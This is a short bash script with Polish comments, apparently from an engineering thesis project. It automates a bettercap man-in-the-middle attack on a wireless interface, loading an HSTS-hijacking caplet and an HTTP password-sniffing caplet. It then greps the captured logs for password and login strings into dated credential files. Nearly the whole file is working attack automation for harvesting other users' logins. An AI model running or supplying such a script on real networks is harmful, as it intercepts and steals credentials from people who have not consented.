#!/bin/bash

#filtrowanie wszystkich przechwytywania
sudo rm /home/ubuntu/credentials-bettercap/*
grep -in -E "pass|login|password|user" /home/ubuntu/bettercap-logs/* > /home/ubuntu/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt

#Regeneracja capletu hstshijack
sudo cp -r /home/ubuntu/inzynierka/bettercap/hstshijack /usr/local/share/bettercap/caplets

#uruchomienie programu bettercap
sudo /home/ubuntu/bettercap-2.32.0/bettercap -iface wlan0 -caplet /home/ubuntu/inzynierka/bettercap/http_passwords.cap  > /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).txt

